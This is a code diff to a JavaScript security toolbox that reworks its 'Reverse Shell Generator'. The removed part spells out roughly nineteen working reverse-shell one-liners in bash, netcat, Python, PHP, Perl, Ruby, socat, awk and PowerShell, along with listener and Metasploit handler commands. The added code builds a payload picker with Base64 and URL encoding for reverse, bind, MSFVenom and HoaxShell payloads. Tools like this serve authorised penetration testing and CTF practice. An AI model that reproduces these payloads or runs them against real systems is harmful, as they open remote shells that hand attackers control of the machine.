@@ -3309,75 +3309,110 @@ TOOLS['notationer'] = {
   }
 };
 
-// ===== REVERSE SHELL GENERATOR =====
-const REVSHELLS = [
-  ['Bash -i',        (ip,port,sh)=>`${sh} -i >& /dev/tcp/${ip}/${port} 0>&1`],
-  ['Bash 196',       (ip,port,sh)=>`0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${sh} <&196 >&196 2>&196`],
-  ['Bash read line', (ip,port,sh)=>`exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`],
-  ['Bash 5',         (ip,port,sh)=>`${sh} -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`],
-  ['nc mkfifo',      (ip,port,sh)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`],
-  ['nc -e',          (ip,port,sh)=>`nc ${ip} ${port} -e ${sh}`],
-  ['nc -c',          (ip,port,sh)=>`nc -c ${sh} ${ip} ${port}`],
-  ['ncat -e',        (ip,port,sh)=>`ncat ${ip} ${port} -e ${sh}`],
-  ['ncat mkfifo',    (ip,port,sh)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|ncat ${ip} ${port} >/tmp/f`],
-  ['Python3',        (ip,port,sh)=>`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${sh}")'`],
-  ['Python3 short',  (ip,port,sh)=>`export RHOST="${ip}";export RPORT=${port};python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${sh}")'`],
-  ['PHP exec',       (ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});exec("${sh} <&3 >&3 2>&3");'`],
-  ['PHP system',     (ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});system("${sh} <&3 >&3 2>&3");'`],
-  ['Perl',           (ip,port,sh)=>`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");};'`],
-  ['Ruby',           (ip,port,sh)=>`ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${sh} -i <&%d >&%d 2>&%d",f,f,f)'`],
-  ['socat',          (ip,port,sh)=>`socat TCP:${ip}:${port} EXEC:${sh}`],
-  ['socat (TTY)',    (ip,port,sh)=>`socat TCP:${ip}:${port} EXEC:'${sh}',pty,stderr,setsid,sigint,sane`],
-  ['awk',            (ip,port,sh)=>`awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`],
-  ['PowerShell',     (ip,port,sh)=>`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`],
-];
+// ===== REVERSE SHELL GENERATOR (data bundled from 0dayCTF/reverse-shell-generator) =====
+const RSG_TYPES = [['ReverseShell', 'Reverse'], ['BindShell', 'Bind'], ['MSFVenom', 'MSFVenom'], ['HoaxShell', 'HoaxShell']];
 TOOLS['revshell'] = {
   title: 'Reverse Shell Generator',
-  desc: 'Generate reverse shell one-liners for many languages and tools',
+  desc: 'Reverse / bind / MSFVenom / HoaxShell payloads with encoding + listeners (revshells-style)',
   render() {
-    const shells = ['/bin/bash','/bin/sh','/bin/zsh','/bin/dash','cmd','powershell'];
+    const D = window.rsgData || { shells: [], listenerCommands: [] };
+    const shells = D.shells || [];
     return `
       <div class="tool">
         <div class="card">
-          <div class="card-title">Configuration</div>
-          <div class="field-row-3">
-            <div class="field"><label>IP (LHOST)</label><input type="text" id="rs-ip" value="10.10.14.1"></div>
-            <div class="field"><label>Port (LPORT)</label><input type="text" id="rs-port" value="4444"></div>
-            <div class="field"><label>Shell</label><select id="rs-shell">${shells.map(s=>`<option>${s}</option>`).join('')}</select></div>
+          <div class="rsg-cfg">
+            <div class="field"><label>IP / Interface</label><input type="text" id="rsg-ip" value="10.10.14.1"></div>
+            <div class="field"><label>Port</label><input type="text" id="rsg-port" value="9001"></div>
+            <div class="field"><label>Shell</label><select id="rsg-shell">${shells.map(s => `<option${s === 'bash' ? ' selected' : ''}>${s}</option>`).join('')}</select></div>
+            <div class="field"><label>Encoding</label><select id="rsg-enc"><option value="none">None</option><option value="b64">Base64</option><option value="url">URL Encode</option><option value="url2">Double URL</option></select></div>
+            <div class="field"><label>OS</label><select id="rsg-os"><option value="all">All</option><option value="linux">Linux</option><option value="windows">Windows</option><option value="mac">Mac</option></select></div>
           </div>
-          <div class="field"><label>Payload</label><select id="rs-type">${REVSHELLS.map((r,i)=>`<option value="${i}">${escapeHtml(r[0])}</option>`).join('')}</select></div>
+          <div class="rsg-tabs" id="rsg-tabs">${RSG_TYPES.map((t, i) => `<button class="rsg-tab${i === 0 ? ' active' : ''}" data-type="${t[0]}">${t[1]}</button>`).join('')}</div>
+          <input type="text" id="rsg-search" placeholder="Filter payloads..." autocomplete="off" style="margin-top:10px">
+        </div>
+        <div class="rsg-grid">
+          <div class="card rsg-listcard"><div class="rsg-list" id="rsg-list"></div></div>
+          <div class="card">
+            <div class="result-header"><h4 id="rsg-name">—</h4><button class="btn btn-ghost" id="rsg-copy">Copy</button></div>
+            <pre class="not-pre mono" id="rsg-out"></pre>
+          </div>
         </div>
         <div class="card">
-          <div class="result-header"><h4 id="rs-name"></h4><button class="btn btn-ghost" id="rs-copy">Copy</button></div>
-          <pre class="not-pre mono" id="rs-out"></pre>
-        </div>
-        <div class="card">
-          <div class="result-header"><h4>Listeners</h4><button class="btn btn-ghost" id="rs-copy-l">Copy</button></div>
-          <pre class="not-pre mono" id="rs-listeners"></pre>
+          <div class="card-title">Listener</div>
+          <div class="field"><select id="rsg-listener">${(D.listenerCommands || []).map((l, i) => `<option value="${i}">${escapeHtml(l[0])}</option>`).join('')}</select></div>
+          <div class="result-header"><h4>Command</h4><button class="btn btn-ghost" id="rsg-lcopy">Copy</button></div>
+          <pre class="not-pre mono" id="rsg-lout"></pre>
         </div>
       </div>`;
   },
   init() {
-    const upd = () => {
-      const ip = $('#rs-ip').value.trim() || 'LHOST';
-      const port = $('#rs-port').value.trim() || 'LPORT';
-      const sh = $('#rs-shell').value;
-      const [name, fn] = REVSHELLS[+$('#rs-type').value];
-      $('#rs-name').textContent = name;
-      $('#rs-out').textContent = fn(ip, port, sh);
-      $('#rs-listeners').textContent = [
-        `nc -lvnp ${port}`,
-        `ncat -lvnp ${port}`,
-        `ncat --ssl -lvnp ${port}`,
-        `socat -d -d TCP-LISTEN:${port} STDOUT`,
-        `rlwrap -cAr nc -lvnp ${port}`,
-        `msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`,
-      ].join('\n');
+    const D = window.rsgData;
+    if (!D) { $('#rsg-out').textContent = 'Reverse-shell data failed to load.'; return; }
+    const fixUrl = s => encodeURIComponent(s).replace(/[!'()*]/g, c => '%' + c.charCodeAt(0).toString(16).toUpperCase());
+    const b64 = s => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
+    const subst = (cmd) => {
+      const ip = $('#rsg-ip').value.trim() || 'IP';
+      const port = $('#rsg-port').value.trim() || 'PORT';
+      const shell = $('#rsg-shell').value;
+      return cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port).replace(/\{shell\}/g, shell);
     };
-    ['rs-ip','rs-port','rs-shell','rs-type'].forEach(id => { const el = $('#'+id); el.addEventListener('input', upd); el.addEventListener('change', upd); });
-    $('#rs-copy').addEventListener('click', () => copy($('#rs-out').textContent));
-    $('#rs-copy-l').addEventListener('click', () => copy($('#rs-listeners').textContent));
-    upd();
+    const encode = (cmd) => {
+      const c = subst(cmd), mode = $('#rsg-enc').value;
+      if (mode === 'b64') return b64(c);
+      if (mode === 'url') return fixUrl(c);
+      if (mode === 'url2') return fixUrl(fixUrl(c));
+      return c;
+    };
+    let activeType = 'ReverseShell', selected = null;
+    const listEl = $('#rsg-list');
+    const matches = () => {
+      const os = $('#rsg-os').value, q = $('#rsg-search').value.trim().toLowerCase();
+      return D.reverseShellCommands.filter(it => it.meta.includes(activeType)
+        && (os === 'all' || it.meta.includes(os))
+        && (!q || it.name.toLowerCase().includes(q)));
+    };
+    const renderOut = () => {
+      if (!selected) { $('#rsg-name').textContent = '—'; $('#rsg-out').textContent = ''; return; }
+      $('#rsg-name').textContent = selected.name;
+      $('#rsg-out').textContent = encode(selected.command);
+    };
+    const renderList = () => {
+      const items = matches();
+      if (items.length) selected = (selected && items.find(x => x.name === selected.name)) || items[0];
+      else selected = null;
+      listEl.innerHTML = items.length
+        ? items.map((it, i) => `<button class="rsg-item${selected && it.name === selected.name ? ' active' : ''}" data-i="${i}">${escapeHtml(it.name)}</button>`).join('')
+        : '<div class="rsg-empty">No payloads match.</div>';
+      $$('.rsg-item', listEl).forEach((b, i) => b.addEventListener('click', () => {
+        selected = items[i];
+        $$('.rsg-item', listEl).forEach(x => x.classList.remove('active'));
+        b.classList.add('active');
+        renderOut();
+      }));
+      renderOut();
+    };
+    const renderListener = () => {
+      const l = D.listenerCommands[+$('#rsg-listener').value];
+      const ip = $('#rsg-ip').value.trim() || 'IP', port = $('#rsg-port').value.trim() || 'PORT';
+      $('#rsg-lout').textContent = l[1].replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
+    };
+    $$('.rsg-tab').forEach(t => t.addEventListener('click', () => {
+      activeType = t.dataset.type;
+      $$('.rsg-tab').forEach(x => x.classList.toggle('active', x === t));
+      selected = null;
+      renderList();
+    }));
+    $('#rsg-ip').addEventListener('input', () => { renderOut(); renderListener(); });
+    $('#rsg-port').addEventListener('input', () => { renderOut(); renderListener(); });
+    $('#rsg-shell').addEventListener('change', renderOut);
+    $('#rsg-enc').addEventListener('change', renderOut);
+    $('#rsg-os').addEventListener('change', renderList);
+    $('#rsg-search').addEventListener('input', renderList);
+    $('#rsg-listener').addEventListener('change', renderListener);
+    $('#rsg-copy').addEventListener('click', () => copy($('#rsg-out').textContent));
+    $('#rsg-lcopy').addEventListener('click', () => copy($('#rsg-lout').textContent));
+    renderList();
+    renderListener();
   }
 };
 
